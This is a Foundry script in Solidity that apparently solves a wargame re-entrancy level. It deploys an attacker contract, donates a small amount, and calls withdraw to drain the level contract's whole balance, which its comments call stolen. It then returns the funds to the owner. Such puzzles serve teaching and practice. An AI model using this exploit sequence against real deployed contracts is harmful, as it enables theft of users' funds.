// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {ReEntranceContract} from "../src/ReEntrance.sol";
import {console2} from "../lib/forge-std/src/console2.sol";

contract ReEntranceScript is Script {
    function run() external {
        vm.startBroadcast();
        ReEntranceContract c = new ReEntranceContract();
        // 1. donate 0.001 ether to level contract
        c.donate{value:0.001 ether}();
        // 2. withdraw from level contract to `c` contract , basically all balance in level contract will be stolen
        c.withdraw();
        // 3. get money back to the owner
        c.getMoneyBack();
        vm.stopBroadcast();
    }
}